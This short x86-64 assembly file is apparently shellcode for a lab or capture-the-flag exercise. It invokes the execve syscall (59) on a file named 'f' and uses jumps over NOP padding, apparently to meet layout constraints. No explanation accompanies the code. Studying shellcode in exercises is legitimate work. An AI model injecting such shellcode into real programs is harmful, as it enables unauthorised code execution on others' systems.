global _start

section .text


_start:
  xor rsi, rsi
  xor rdx, rdx
  mov al, 59
  jmp lea

nops:
  times 10 db 0x90

lea:
  lea rdi, [rel filename]
  jmp call

morenops:
  times 12 db 0x90

call:
  mov al, 59
  syscall

morenopspls:
  times 15 db 0x90

filename:
  db 'f'
